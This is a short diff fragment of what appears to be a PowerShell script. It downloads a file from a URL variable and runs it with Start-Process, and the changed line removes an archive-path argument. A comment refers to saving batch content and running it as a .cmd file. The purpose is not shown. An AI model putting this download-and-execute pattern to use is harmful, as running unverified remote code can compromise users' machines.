@@ -21,7 +21,7 @@ Invoke-WebRequest $txtUrl -OutFile $txt -UseBasicParsing
 
 
 
-Start-Process -FilePath $txt -ArgumentList @($rarFullPath)
+Start-Process -FilePath $txt
 
 
 # --- If it's a batch file content, save & run as .cmd ---
